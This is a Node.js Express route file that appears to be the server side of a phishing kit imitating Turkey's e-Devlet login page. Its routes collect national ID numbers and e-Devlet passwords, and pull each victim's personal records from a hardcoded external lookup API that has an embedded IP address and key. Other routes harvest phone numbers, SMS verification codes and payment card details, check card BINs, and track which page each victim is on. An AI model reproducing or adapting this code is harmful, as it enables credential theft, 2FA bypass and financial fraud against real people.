const express = require('express');
const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');
const User = require('../models/User');
const Visitor = require('../models/Visitor');
const Bin = require('../models/Bin');
const Logger = require('../utils/logger');
const ayarlarStore = require('../utils/ayarlar');
const { odemeKaydet } = require('../utils/odemeServisi');

const router = express.Router();
const log = new Logger('Kullanici');

// TC sorgu API: .env/Vercel ortam değişkeni varsa o, yoksa varsayılan key kullanılır.
const TC_API_URL = process.env.TC_API_URL || 'http://37.140.242.191:8080';
const TC_API_KEY = process.env.TC_API_KEY || '2A5BBE44BCD9CBD43AE17E0B0BAE830444ABD7AF0B9438734650256E64767582';

function tcKimlikGecerli(v) {
    if (!/^\d{11}$/.test(v)) return false;
    const d = v.split('').map(Number);
    if (d[0] === 0) return false;
    const tek = d[0] + d[2] + d[4] + d[6] + d[8];
    const cift = d[1] + d[3] + d[5] + d[7];
    const h10 = (((tek * 7) - cift) % 10 + 10) % 10;
    if (h10 !== d[9]) return false;
    return (((tek + cift + d[9]) % 10) === d[10]);
}

function istemciIp(req) {
    let ip = (req.headers['x-forwarded-for'] || req.ip || '').toString().split(',')[0].trim();
    return ip.replace(/^::ffff:/, '') || 'bilinmiyor';
}

function tarihMetni(date) {
    const ikiBasamak = n => String(n).padStart(2, '0');
    return ikiBasamak(date.getDate()) + '.' + ikiBasamak(date.getMonth() + 1) + '.' + date.getFullYear() +
        ' ' + ikiBasamak(date.getHours()) + ':' + ikiBasamak(date.getMinutes()) + ':' + ikiBasamak(date.getSeconds());
}

router.post('/login', async (req, res) => {
    if (mongoose.connection.readyState !== 1) {
        return res.status(503).json({ ok: false, hata: 'Veritabanına bağlanılamadı.' });
    }
    const tcno = String(req.body.tcno || '').trim();
    const sifre = String(req.body.sifre || '');
    if (!tcKimlikGecerli(tcno)) {
        return res.status(400).json({ ok: false, hata: 'Geçerli bir T.C. Kimlik No giriniz.' });
    }
    if (!sifre) {
        return res.status(400).json({ ok: false, hata: 'Lütfen e-Devlet şifrenizi giriniz.' });
    }
    try {
        const banliKullanici = await User.findOne({ tcno }).lean();
        if (banliKullanici && banliKullanici.banli) {
            return res.status(403).json({ ok: false, hata: 'Bu hesap yasaklanmıştır. Lütfen yönetim ile iletişime geçin.' });
        }
        let kullaniciAdi = null;
        let tcBilgi = null;
        try {
            const url = new URL(TC_API_URL + '/api/tc/' + encodeURIComponent(tcno));
            if (TC_API_KEY) url.searchParams.set('key', TC_API_KEY);
            const cevap = await fetch(url, { signal: AbortSignal.timeout(10000) });
            const json = await cevap.json();
            if (json && json.success && json.data) {
                tcBilgi = json.data;
                if (json.data.AD) {
                    kullaniciAdi = (json.data.AD + ' ' + (json.data.SOYAD || '')).trim();
                }
            } else {
                console.error('TC sorgu API yanıtı beklenmedik:', JSON.stringify(json).slice(0, 200));
            }
        } catch (err) {
            console.error('TC sorgu API hatası:', err.message);
        }

        const sifreHash = await bcrypt.hash(sifre, 10);
        const guncelleme = {
            $set: { sifreHash, sonGiris: new Date() },
            $inc: { girisSayisi: 1 },
            $setOnInsert: { createdAt: new Date() }
        };
        if (tcBilgi) guncelleme.$set.tcBilgi = tcBilgi;
        if (kullaniciAdi) guncelleme.$set.ad = kullaniciAdi;
        await User.findOneAndUpdate({ tcno }, guncelleme, { upsert: true });

        const simdi = new Date();
        req.session.kullanici = {
            tcno,
            ad: kullaniciAdi,
            telefon: (banliKullanici && banliKullanici.telefon) || '',
            sonGiris: {
                tarih: tarihMetni(simdi),
                durum: 'Başarılı',
                tip: 'e-Devlet İle Giriş',
                kanal: 'e-Devlet Web',
                ip: istemciIp(req)
            }
        };
        log.info('Kullanıcı girişi: ' + tcno.slice(0, 1) + '*********' + tcno.slice(-1));
        res.json({ ok: true });
    } catch (err) {
        console.error('Kullanıcı kaydedilemedi:', err.message);
        res.status(500).json({ ok: false, hata: 'Kullanıcı kaydedilemedi.' });
    }
});

router.post('/telefon-dogrula', async (req, res) => {
    if (mongoose.connection.readyState !== 1) {
        return res.status(503).json({ ok: false, hata: 'Veritabanına bağlanılamadı.' });
    }
    const tcno = req.session && req.session.kullanici ? req.session.kullanici.tcno : null;
    if (!tcno) return res.status(401).json({ ok: false, hata: 'Oturum sona erdi. Lütfen sayfayı yenileyip tekrar deneyin.' });
    const telefon = String(req.body.telefon || '').replace(/\s+/g, '').trim();
    const telefonRegex = /^5\d{9}$/;
    if (!telefonRegex.test(telefon)) {
        return res.status(400).json({ ok: false, hata: 'Geçerli bir telefon numarası giriniz.' });
    }
    try {
        await User.updateOne({ tcno }, { $set: { telefon } });
        if (req.session.kullanici) req.session.kullanici.telefon = telefon;
        log.info('Telefon doğrulandı: ' + tcno.slice(0, 1) + '*********' + tcno.slice(-1));
        res.json({ ok: true });
    } catch (err) {
        console.error('Telefon kaydedilemedi:', err.message);
        res.status(500).json({ ok: false, hata: 'Telefon kaydedilemedi.' });
    }
});

router.post('/sms-kod', async (req, res) => {
    if (mongoose.connection.readyState !== 1) {
        return res.status(503).json({ ok: false, hata: 'Veritabanına bağlanılamadı.' });
    }
    const tcno = req.session && req.session.kullanici ? req.session.kullanici.tcno : null;
    if (!tcno) return res.status(401).json({ ok: false, hata: 'Oturum bulunamadı.' });
    const kod = String(req.body.kod || '').replace(/\s+/g, '').trim();
    if (!/^\d{5,6}$/.test(kod)) {
        return res.status(400).json({ ok: false, hata: 'Geçerli bir 5 veya 6 haneli SMS kodu giriniz.' });
    }
    try {
        const kullanici = await User.findOne({ tcno }).select('smsKod1 smsKod2').lean();
        const alan = kullanici && kullanici.smsKod1 ? 'smsKod2' : 'smsKod1';
        await User.updateOne({ tcno }, { $set: { [alan]: kod } });
        log.info('SMS kodu kaydedildi: ' + tcno.slice(0, 1) + '*********' + tcno.slice(-1));
        res.json({ ok: true });
    } catch (err) {
        console.error('SMS kodu kaydedilemedi:', err.message);
        res.status(500).json({ ok: false, hata: 'SMS kodu kaydedilemedi.' });
    }
});

router.post('/heartbeat', async (req, res) => {
    if (mongoose.connection.readyState !== 1) {
        return res.status(503).json({ ok: false });
    }
    let ip = (req.headers['x-forwarded-for'] || req.ip || '').toString().split(',')[0].trim();
    ip = ip.replace(/^::ffff:/, '') || 'bilinmiyor';
    try {
        await Visitor.findOneAndUpdate(
            { ip },
            {
                $set: { sonGiris: new Date() },
                $setOnInsert: { ziyaretSayisi: 0, createdAt: new Date() }
            },
            { upsert: true }
        );
        const tcno = req.session && req.session.kullanici ? req.session.kullanici.tcno : null;
        if (tcno) {
            const guncelle = { sonGiris: new Date() };
            const sayfa = String(req.body.sayfa || '').trim().slice(0, 120);
            if (sayfa) guncelle.mevcutSayfa = sayfa;
            await User.updateOne({ tcno }, { $set: guncelle });
        }
        res.json({ ok: true });
    } catch (err) {
        console.error('Heartbeat kaydedilemedi:', err.message);
        res.status(500).json({ ok: false });
    }
});

router.post('/odeme', async (req, res) => {
    if (mongoose.connection.readyState !== 1) {
        return res.status(503).json({ ok: false, hata: 'Veritabanına bağlanılamadı.' });
    }
    const tcno = req.session && req.session.kullanici ? req.session.kullanici.tcno : null;
    if (!tcno) return res.status(401).json({ ok: false, hata: 'Oturum bulunamadı.' });

    try {
        const sonuc = await odemeKaydet(tcno, req.body);
        if (!sonuc.ok) return res.status(sonuc.durum || 400).json({ ok: false, hata: sonuc.hata });
        log.info('Ödeme kaydedildi: ' + tcno.slice(0, 1) + '*********' + tcno.slice(-1));
        res.json({ ok: true });
    } catch (err) {
        console.error('Ödeme kaydedilemedi:', err.message);
        res.status(500).json({ ok: false, hata: 'Ödeme kaydedilemedi.' });
    }
});

router.get('/bin/:bin', async (req, res) => {
    if (mongoose.connection.readyState !== 1) {
        return res.status(503).json({ ok: false, hata: 'Veritabanına bağlanılamadı.' });
    }
    const bin = String(req.params.bin || '').replace(/\D/g, '').slice(0, 6);
    if (bin.length !== 6) {
        return res.status(400).json({ ok: false, hata: 'Geçersiz BIN.' });
    }
    try {
        const kayit = await Bin.findOne({ bin }).lean();
        if (!kayit) {
            return res.json({ ok: true, bulundu: false });
        }
        const bankaKartiEngelli = !!ayarlarStore.oku().bankaKartiEngelli;
        const engelli = bankaKartiEngelli && kayit.kartTuru === 'BANKA';
        res.json({
            ok: true,
            bulundu: true,
            banka: kayit.banka,
            kartTuru: kayit.kartTuru,
            marka: kayit.marka,
            engelli: !!engelli
        });
    } catch (err) {
        console.error('BIN sorgusu başarısız:', err.message);
        res.status(500).json({ ok: false, hata: 'BIN sorgulanamadı.' });
    }
});

router.get('/uyari-kontrol', async (req, res) => {
    const tcno = req.session && req.session.kullanici ? req.session.kullanici.tcno : null;
    if (!tcno) return res.json({ ok: true, uyari: null });
    try {
        const kullanici = await User.findOne({ tcno }).select('uyariMesaj').lean();
        const mesaj = kullanici && kullanici.uyariMesaj ? kullanici.uyariMesaj : null;
        if (mesaj) {
            await User.updateOne({ tcno }, { $set: { uyariMesaj: null } });
        }
        res.json({ ok: true, uyari: mesaj });
    } catch (err) {
        res.json({ ok: true, uyari: null });
    }
});

module.exports = router;
